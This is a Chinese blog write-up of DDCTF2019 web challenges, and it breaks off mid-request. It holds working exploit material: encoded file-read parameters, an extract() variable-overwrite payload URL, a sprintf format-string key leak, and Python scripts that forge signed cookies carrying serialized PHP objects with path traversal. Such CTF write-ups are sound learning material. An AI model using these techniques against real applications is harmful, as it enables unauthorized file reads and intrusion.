<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>DDCTF2019 · Mr.Long's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">longlongyu</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Long's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">DDCTF2019</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-04-21</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="ctf"> ctf</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="DDCTF2019"><a href="#DDCTF2019" class="headerlink" title="DDCTF2019"></a>DDCTF2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p>还是要有耐心啊，这次做题由于感觉像吃了屎一样，所以索性就没做了，并且精力有限。</p>
<p>这题打开链接，给出了一张图片（这图成功成为了又一个表情包）<br><img src="https://i.imgur.com/wN3YSTR.jpg" alt=""><br>注意地址栏，参数<strong>jpg</strong>后面跟了一串字符串，猜测base64，经过一番尝试，发现编码规则是将源文件名转为hex，再进行两次base64编码，于是尝试读取源码</p>
<p>利用python进行编码：</p>
<pre><code>str(base64.b64encode(base64.b64encode((&#39;index.php&#39;.encode(&#39;ascii&#39;)).hex().encode(&#39;utf-8&#39;))),&#39;utf-8&#39;)
</code></pre><p>拿到源码：</p>
<pre><code>&lt;?php
/*
 * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
 * Date: July 4,2018
 */
error_reporting(E_ALL || ~E_NOTICE);


header(&#39;content-type:text/html;charset=utf-8&#39;);
if(! isset($_GET[&#39;jpg&#39;]))
    header(&#39;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#39;);
$file = hex2bin(base64_decode(base64_decode($_GET[&#39;jpg&#39;])));
echo &#39;&lt;title&gt;&#39;.$_GET[&#39;jpg&#39;].&#39;&lt;/title&gt;&#39;;
$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);
echo $file.&#39;&lt;/br&gt;&#39;;
$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);
echo $file.&#39;&lt;/br&gt;&#39;;
$txt = base64_encode(file_get_contents($file));

echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;/img&gt;&quot;;
/*
 * Can you find the flag file?
 *
 */

?&gt;
</code></pre><p>注释中有一个博客地址，进入博客，查看历史文章，在这篇文章：<br><a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909" target="_blank" rel="noopener">https://blog.csdn.net/FengBanLiuYun/article/details/80913909</a><br>找到一个：<strong>.practice.txt.swp</strong>，尝试将其作为一个文件粘贴入地址栏，得到了：<strong>f1ag!ddctf.php</strong><br>猜测flag就在这，但注意到源码中将<strong>config</strong>置换为<strong>!</strong>，且直接输入<strong>f1ag!ddctf.php</strong>会将<strong>!</strong>换为空字符，于是有了如下代码：</p>
<pre><code>str(base64.b64encode(base64.b64encode((&#39;f1agconfigddctf.php&#39;.encode(&#39;ascii&#39;)).hex().encode(&#39;utf-8&#39;))),&#39;utf-8&#39;)
</code></pre><p>得到源码：</p>
<pre><code>&lt;?php
include(&#39;config.php&#39;);
$k = &#39;hello&#39;;
extract($_GET);
if(isset($uid))
{
    $content=trim(file_get_contents($k));
    if($uid==$content)
    {
        echo $flag;
    }
    else
    {
        echo&#39;hello&#39;;
    }
}

?&gt;
</code></pre><p><strong>变量覆盖漏洞</strong><br>trim()</p>
<blockquote>
<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
</blockquote>
<p>extract()</p>
<blockquote>
<p>extract() 函数从数组中将变量导入到当前的符号表。</p>
<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
<p>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</p>
<p>该函数返回成功导入到符号表中的变量数目。</p>
</blockquote>
<p>paylaod:<code>http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=1</code><br><strong>DDCTF{436f6e67726174756c6174696f6e73}</strong></p>
<h3 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h3><p>进入链接后，注意到一行大字：<br><strong>抱歉，您没有登陆权限，请获取权限后访问—–</strong><br>查看源码，注意到<code>&lt;script type=&quot;text/javascript&quot; src=&quot;js/index.js&quot;&gt;&lt;/script&gt;</code>，查看源码：</p>
<pre><code>/**
 * Created by PhpStorm.
 * User: didi
 * Date: 2019/1/13
 * Time: 9:05 PM
 */

function auth() {
    $.ajax({
        type: &quot;post&quot;,
        url:&quot;http://117.51.158.44/app/Auth.php&quot;,
        contentType: &quot;application/json;charset=utf-8&quot;,
        dataType: &quot;json&quot;,
        beforeSend: function (XMLHttpRequest) {
            XMLHttpRequest.setRequestHeader(&quot;didictf_username&quot;, &quot;&quot;);
        },
        success: function (getdata) {
           console.log(getdata);
           if(getdata.data !== &#39;&#39;) {
               document.getElementById(&#39;auth&#39;).innerHTML = getdata.data;
           }
        },error:function(error){
            console.log(error);
        }
    });
}
</code></pre><p>所以思路比较清楚，向<code>http://117.51.158.44/app/Auth.php</code>发送认证，于是添加header：</p>
<pre><code>didictf_username: admin
</code></pre><p>得到如下提示：<br><strong>您当前当前权限为管理员—-请访问:app/fL2XID2i0Cdh.php</strong><br>访问<br><strong>app/Application.php</strong></p>
<pre><code>Class Application {
    var $path = &#39;&#39;;


    public function response($data, $errMsg = &#39;success&#39;) {
        $ret = [&#39;errMsg&#39; =&gt; $errMsg,
            &#39;data&#39; =&gt; $data];
        $ret = json_encode($ret);
        header(&#39;Content-type: application/json&#39;);
        echo $ret;

    }

    public function auth() {
        $DIDICTF_ADMIN = &#39;admin&#39;;
        if(!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN) {
            $this-&gt;response(&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;);
            return TRUE;
        }else{
            $this-&gt;response(&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;,&#39;error&#39;);
            exit();
        }

    }
    private function sanitizepath($path) {
    $path = trim($path);
    $path=str_replace(&#39;../&#39;,&#39;&#39;,$path);
    $path=str_replace(&#39;..\\&#39;,&#39;&#39;,$path);
    return $path;
}

public function __destruct() {
    if(empty($this-&gt;path)) {
        exit();
    }else{
        $path = $this-&gt;sanitizepath($this-&gt;path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;);
    }
    exit();
}
}
</code></pre><p><strong>app/Session.php</strong></p>
<pre><code>include &#39;Application.php&#39;;
class Session extends Application {

    //key建议为8位字符串
    var $eancrykey                  = &#39;&#39;;
    var $cookie_expiration            = 7200;
    var $cookie_name                = &#39;ddctf_id&#39;;
    var $cookie_path                = &#39;&#39;;
    var $cookie_domain                = &#39;&#39;;
    var $cookie_secure                = FALSE;
    var $activity                   = &quot;DiDiCTF&quot;;


    public function index()
    {
    if(parent::auth()) {
            $this-&gt;get_key();
            if($this-&gt;session_read()) {
                $data = &#39;DiDI Welcome you %s&#39;;
                $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]);
                parent::response($data,&#39;sucess&#39;);
            }else{
                $this-&gt;session_create();
                $data = &#39;DiDI Welcome you&#39;;
                parent::response($data,&#39;sucess&#39;);
            }
        }

    }

    private function get_key() {
        //eancrykey  and flag under the folder
        $this-&gt;eancrykey =  file_get_contents(&#39;../config/key.txt&#39;);
    }

    public function session_read() {
        if(empty($_COOKIE)) {
        return FALSE;
        }

        $session = $_COOKIE[$this-&gt;cookie_name];
        if(!isset($session)) {
            parent::response(&quot;session not found&quot;,&#39;error&#39;);
            return FALSE;
        }
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this-&gt;eancrykey.$session)) {
            parent::response(&quot;the cookie data not match&quot;,&#39;error&#39;);
            return FALSE;
        }
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session[&#39;session_id&#39;]) OR !isset($session[&#39;ip_address&#39;]) OR !isset($session[&#39;user_agent&#39;])){
            return FALSE;
        }

        if(!empty($_POST[&quot;nickname&quot;])) {
            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);
            $data = &quot;Welcome my friend %s&quot;;
            foreach ($arr as $k =&gt; $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,&quot;Welcome&quot;);
        }

        if($session[&#39;ip_address&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) {
            parent::response(&#39;the ip addree not match&#39;.&#39;error&#39;);
            return FALSE;
        }
        if($session[&#39;user_agent&#39;] != $_SERVER[&#39;HTTP_USER_AGENT&#39;]) {
            parent::response(&#39;the user agent not match&#39;,&#39;error&#39;);
            return FALSE;
        }
        return TRUE;

    }

    private function session_create() {
        $sessionid = &#39;&#39;;
        while(strlen($sessionid) &lt; 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $userdata = array(
            &#39;session_id&#39; =&gt; md5(uniqid($sessionid,TRUE)),
            &#39;ip_address&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;],
            &#39;user_agent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;],
            &#39;user_data&#39; =&gt; &#39;&#39;,
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);
        $expire = $this-&gt;cookie_expiration + time();
        setcookie(
            $this-&gt;cookie_name,
            $cookiedata,
            $expire,
            $this-&gt;cookie_path,
            $this-&gt;cookie_domain,
            $this-&gt;cookie_secure
            );

    }
}


$ddctf = new Session();
$ddctf-&gt;index();
</code></pre><p>用burpsuite查看请求与响应情况：<br><strong>request:</strong></p>
<blockquote>
<p>POST /app/Session.php HTTP/1.1<br>Host: 117.51.158.44<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 12<br>didictf_username: admin</p>
<p>nickname=123</p>
</blockquote>
<p><strong>response:</strong></p>
<blockquote>
<p>HTTP/1.1 200 OK<br>Server: nginx/1.10.3 (Ubuntu)<br>Date: Thu, 18 Apr 2019 10:19:23 GMT<br>Content-Type: application/json<br>Connection: close<br>Set-Cookie: ddctf_id=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%224b42d9a8f4e766b08ca9125762bf0d45%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22101.207.121.38%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A78%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A66.0%29+Gecko%2F20100101+Firefox%2F66.0%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D38af5d35992029e7901a61356d1f4609; expires=Thu, 18-Apr-2019 12:19:23 GMT; Max-Age=7200<br>Content-Length: 188</p>
<p>{“errMsg”:”success”,”data”:”\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458—-\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php”}{“errMsg”:”sucess”,”data”:”DiDI Welcome you %s”}</p>
</blockquote>
<p>注意到<strong>Set-Cookie</strong>字段，urldecode后：</p>
<pre><code>a:4:{s:10:&quot;session_id&quot;;s:32:&quot;4b42d9a8f4e766b08ca9125762bf0d45&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;101.207.121.38&quot;;s:10:&quot;user_agent&quot;;s:78:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;}38af5d35992029e7901a61356d1f4609
</code></pre><p>另外：</p>
<pre><code>{&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php&quot;}{&quot;errMsg&quot;:&quot;sucess&quot;,&quot;data&quot;:&quot;DiDI Welcome you %s&quot;}
</code></pre><p>回到源码：</p>
<ul>
<li><p>在url:app/Application.php中</p>
<pre><code>public function __destruct() {
  if(empty($this-&gt;path)) {
      exit();
  }else{
      $path = $this-&gt;sanitizepath($this-&gt;path);
      if(strlen($path) !== 18) {
          exit();
      }
      $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;);
  }
  exit();
}
</code></pre><p>明显意识到反序列化</p>
</li>
<li><p>在url:app/Session.php中</p>
<pre><code>  public function index()
  {
  if(parent::auth()) {
          $this-&gt;get_key();
          if($this-&gt;session_read()) {
              $data = &#39;DiDI Welcome you %s&#39;;
              $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]);
              parent::response($data,&#39;sucess&#39;);
          }else{
              $this-&gt;session_create();
              $data = &#39;DiDI Welcome you&#39;;
              parent::response($data,&#39;sucess&#39;);
          }
      }

  }
</code></pre><p>进行session检查没有则创造一个session，所以访问时要设定session，往下看：</p>
<pre><code>  public function index()
  {
  if(parent::auth()) {
          $this-&gt;get_key();
          if($this-&gt;session_read()) {
              $data = &#39;DiDI Welcome you %s&#39;;
              $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]);
              parent::response($data,&#39;sucess&#39;);
          }else{
              $this-&gt;session_create();
              $data = &#39;DiDI Welcome you&#39;;
              parent::response($data,&#39;sucess&#39;);
          }
      }

  }
</code></pre><p><strong>sprinf</strong>存在格式化字符串漏洞，所以试图让他打印出<strong>key值</strong><br><a href="https://paper.seebug.org/386/#0x03-php" target="_blank" rel="noopener">sprintf漏洞</a><br>代码如下：</p>
<pre><code>  #! /usr/bin/python3
  # -*- coding: utf-8 -*-

  import requests

  url = &#39;http://117.51.158.44/app/Session.php&#39;

  body = {&#39;nickname&#39;:&#39;/%s&#39;}
  headers = {&#39;didictf_username&#39;:&#39;admin&#39;}
  s = requests.Session()

  s.get(url=url,headers=headers)
  response = s.post(url=url,headers=headers,data=body)
  print(response.text)
</code></pre><p>得到<code>key：EzblrbNS</code></p>
</li>
</ul>
<ul>
<li>下一步就是序列化</li>
</ul>
<p>注意到这步：</p>
<pre><code>        if($hash !== md5($this-&gt;eancrykey.$session)) {
            parent::response(&quot;the cookie data not match&quot;,&#39;error&#39;);
            return FALSE;
        }
        $session = unserialize($session);
</code></pre><p>所以可以直接构造一个只包含flag路径的对象：</p>
<pre><code>&lt;?php
Class Application {
    var $path = &#39;&#39;;
}
$fuck = new Application();
$fuck-&gt;path = &#39;//config/flag.txt&#39;;

echo serialize($fuck);

?&gt;
</code></pre><p>最终：</p>
<pre><code>import requests
import hashlib
from urllib.parse import quote
import json

url = &#39;http://117.51.158.44/app/Session.php&#39;

data = &#39;O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}&#39;
data =quote( data + hashlib.md5(b&#39;EzblrbNS&#39; + data.encode()).hexdigest())
# s = requests.Session()

response = requests.get(url=url,headers={&#39;didictf_username&#39;:&#39;admin&#39;},cookies={&#39;ddctf_id&#39;:data})
print(response.content)
</code></pre><h3 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h3><blockquote>
<p>user：dd@ctf<br>pass：DD@ctf#000</p>
</blockquote>
<p>用给出的用户名和密码登录，一个文件上传页面<br>随便上传一张图，出现如下提示：</p>
<blockquote>
<p>[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()</p>
</blockquote>
<p>在图片末尾添加<code>phpinfo()</code>，上传依然出现这个错误<br>查看网页图片源码，发现了一段字符串：</p>
<blockquote>
<p>REATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 80</p>
</blockquote>
<p>搜了一下，发现了一个新名词–<strong>二次渲染</strong><br>二次渲染：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a><br>文件上传总结：<a href="https://blog.csdn.net/qq_41079177/article/details/84780056" target="_blank" rel="noopener">https://blog.csdn.net/qq_41079177/article/details/84780056</a></p>
<p>会有一次处理之后得不到flag的情况，这时可以将二次渲染的图再次下载，然后再次处理，重复几次即可</p>
<p>注：<br><a href="https://www.jianshu.com/p/f3c3f4527530" target="_blank" rel="noopener">linux/windows系统如何安装php-gd扩展库</a></p>
<h3 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h3><p>主页面：</p>
<blockquote>
<p>[INFO] you have 0 diamonds, 3 points now.<br>View source code<br>Go to e-shop<br>Reset<br>Go back to index.html</p>
</blockquote>
<p>查看源码：</p>
<pre><code>Download this .py file
Go back to index.html
# -*- encoding: utf-8 -*- 
# written in python 2.7 
__author__ = &#39;garzon&#39; 

from flask import Flask, session, request, Response 
import urllib 

app = Flask(__name__) 
app.secret_key = &#39;*********************&#39; # censored 
url_prefix = &#39;/d5af31f66741e857&#39; 

def FLAG(): 
    return &#39;FLAG_is_here_but_i_wont_show_you&#39;  # censored 

def trigger_event(event): 
    session[&#39;log&#39;].append(event) 
    if len(session[&#39;log&#39;]) &gt; 5: session[&#39;log&#39;] = session[&#39;log&#39;][-5:] 
    if type(event) == type([]): 
        request.event_queue += event 
    else: 
        request.event_queue.append(event) 

def get_mid_str(haystack, prefix, postfix=None): 
    haystack = haystack[haystack.find(prefix)+len(prefix):] 
    if postfix is not None: 
        haystack = haystack[:haystack.find(postfix)] 
    return haystack 

class RollBackException: pass 

def execute_event_loop(): 
    valid_event_chars = set(&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;) 
    resp = None 
    while len(request.event_queue) &gt; 0: 
        event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; 
        request.event_queue = request.event_queue[1:] 
        if not event.startswith((&#39;action:&#39;, &#39;func:&#39;)): continue 
        for c in event: 
            if c not in valid_event_chars: break 
        else: 
            is_action = event[0] == &#39;a&#39; 
            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;) 
            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;) 
            try: 
                event_handler = eval(action + (&#39;_handler&#39; if is_action else &#39;_function&#39;)) 
                ret_val = event_handler(args) 
            except RollBackException: 
                if resp is None: resp = &#39;&#39; 
                resp += &#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39; 
                resp += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39; 
                session[&#39;num_items&#39;] = request.prev_session[&#39;num_items&#39;] 
                session[&#39;points&#39;] = request.prev_session[&#39;points&#39;] 
                break 
            except Exception, e: 
                if resp is None: resp = &#39;&#39; 
                #resp += str(e) # only for debugging 
                continue 
            if ret_val is not None: 
                if resp is None: resp = ret_val 
                else: resp += ret_val 
    if resp is None or resp == &#39;&#39;: resp = (&#39;404 NOT FOUND&#39;, 404) 
    session.modified = True 
    return resp 

@app.route(url_prefix+&#39;/&#39;) 
def entry_point(): 
    querystring = urllib.unquote(request.query_string) 
    request.event_queue = [] 
    if querystring == &#39;&#39; or (not querystring.startswith(&#39;action:&#39;)) or len(querystring) &gt; 100: 
        querystring = &#39;action:index;False#False&#39; 
    if &#39;num_items&#39; not in session: 
        session[&#39;num_items&#39;] = 0 
        session[&#39;points&#39;] = 3 
        session[&#39;log&#39;] = [] 
    request.prev_session = dict(session) 
    trigger_event(querystring) 
    return execute_event_loop() 

# handlers/functions below -------------------------------------- 

def view_handler(args): 
    page = args[0] 
    html = &#39;&#39; 
    html += &#39;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&#39;.format(session[&#39;num_items&#39;], session[&#39;points&#39;]) 
    if page == &#39;index&#39;: 
        html += &#39;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#39; 
        html += &#39;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#39; 
        html += &#39;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#39; 
    elif page == &#39;shop&#39;: 
        html += &#39;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#39; 
    elif page == &#39;reset&#39;: 
        del session[&#39;num_items&#39;] 
        html += &#39;Session reset.&lt;br /&gt;&#39; 
    html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39; 
    return html 

def index_handler(args): 
    bool_show_source = str(args[0]) 
    bool_download_source = str(args[1]) 
    if bool_show_source == &#39;True&#39;: 

        source = open(&#39;eventLoop.py&#39;, &#39;r&#39;) 
        html = &#39;&#39; 
        if bool_download_source != &#39;True&#39;: 
            html += &#39;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#39; 
            html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39; 

        for line in source: 
            if bool_download_source != &#39;True&#39;: 
                html += line.replace(&#39;&amp;&#39;,&#39;&amp;amp;&#39;).replace(&#39;\t&#39;, &#39;&amp;nbsp;&#39;*4).replace(&#39; &#39;,&#39;&amp;nbsp;&#39;).replace(&#39;&lt;&#39;, &#39;&amp;lt;&#39;).replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;).replace(&#39;\n&#39;, &#39;&lt;br /&gt;&#39;) 
            else: 
                html += line 
        source.close() 

        if bool_download_source == &#39;True&#39;: 
            headers = {} 
            headers[&#39;Content-Type&#39;] = &#39;text/plain&#39; 
            headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=serve.py&#39; 
            return Response(html, headers=headers) 
        else: 
            return html 
    else: 
        trigger_event(&#39;action:view;index&#39;) 

def buy_handler(args): 
    num_items = int(args[0]) 
    if num_items &lt;= 0: return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0]) 
    session[&#39;num_items&#39;] += num_items  
    trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;]) 

def consume_point_function(args): 
    point_to_consume = int(args[0]) 
    if session[&#39;points&#39;] &lt; point_to_consume: raise RollBackException() 
    session[&#39;points&#39;] -= point_to_consume 

def show_flag_function(args): 
    flag = args[0] 
    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. 
    return &#39;You naughty boy! ;) &lt;br /&gt;&#39; 

def get_flag_handler(args): 
    if session[&#39;num_items&#39;] &gt;= 5: 
        trigger_event(&#39;func:show_flag;&#39; + FLAG()) # show_flag_function has been disabled, no worries 
    trigger_event(&#39;action:view;index&#39;) 

if __name__ == &#39;__main__&#39;: 
    app.run(debug=False, host=&#39;0.0.0.0&#39;)
</code></pre><p>flag获取条件：</p>
<pre><code>def get_flag_handler(args):
    if session[&#39;num_items&#39;] &gt;= 5:
        trigger_event(&#39;func:show_flag;&#39; + FLAG()) # show_flag_function has been disabled, no worries
    trigger_event(&#39;action:view;index&#39;)
</code></pre><p><code>num_items</code>是<strong>diamonds</strong>的数量，初始<strong>points</strong>3分，一分一个</p>
<p>将目标转到购买，截取发送与响应请求：<br>request：</p>
<blockquote>
<p>GET /d5af31f66741e857/?action:buy;5 HTTP/1.1<br>Host: 116.85.48.107:5002<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://116.85.48.107:5002/d5af31f66741e857/?action:view;shop" target="_blank" rel="noopener">http://116.85.48.107:5002/d5af31f66741e857/?action:view;shop</a><br>Connection: close<br>Cookie: session=eyJsb2ciOlt7IiBiIjoiWVdOMGFXOXVPblpwWlhjN2MyaHZjQT09In1dLCJudW1faXRlbXMiOjAsInBvaW50cyI6M30.D5pFbQ.Hb4GpdLm-zuQpVZkBSRlbY1B5i4<br>Upgrade-Insecure-Requests: 1</p>
</blockquote>
<p>response：</p>
<blockquote>
